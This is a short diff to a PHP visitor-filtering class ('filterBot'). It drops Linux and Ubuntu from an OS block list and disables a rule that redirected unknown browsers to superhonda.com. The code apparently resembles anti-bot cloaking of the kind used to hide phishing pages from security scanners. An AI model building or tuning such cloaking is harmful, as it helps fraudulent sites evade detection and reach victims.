@@ -155,8 +155,6 @@ class filterBot{
 
 $restricted_os = [
     'Unknown OS Platform',
-    'Ubuntu',
-    'Linux',
     'Windows XP',
     'Windows Server 2003/XP x64',
     'Windows 7'
@@ -166,11 +164,12 @@ $restricted_os = [
 $user_browser = filterBot::get_browser();
 $user_os = filterBot::get_os();
 
-if ($user_browser === 'Unknown Browser') {
-    header('HTTP/1.1 403 Forbidden');
-    header("Location: https://www.superhonda.com/");
-    die('Access Denied - Suspicious Browser Detected');
-}
+// Browser detection disabled to allow VPN and uncommon browsers
+// if ($user_browser === 'Unknown Browser') {
+//     header('HTTP/1.1 403 Forbidden');
+//     header("Location: https://www.superhonda.com/");
+//     die('Access Denied - Suspicious Browser Detected');
+// }
 
 if (in_array($user_os, $restricted_os)) {
     header('HTTP/1.1 403 Forbidden');
